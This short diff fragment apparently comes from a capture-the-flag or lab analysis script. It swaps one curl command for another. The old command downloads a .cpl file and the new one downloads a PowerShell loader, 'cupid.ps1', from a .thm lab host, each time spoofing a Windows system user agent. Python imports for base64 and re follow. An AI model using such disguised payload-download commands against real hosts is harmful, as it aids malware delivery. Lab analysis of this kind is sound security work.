@@ -1,4 +1,4 @@
-curl -A "CertUtil URL Agent" http://gifts.bemyvalentine.thm:8080/bthprprs.cpl -o bthprprs.cpl
+curl -A "WindowsPowerShell/5.1.19041.1237" http://loader.sweethearts.thm/cupid.ps1 -o cupid.ps1
 import base64
 import re
 
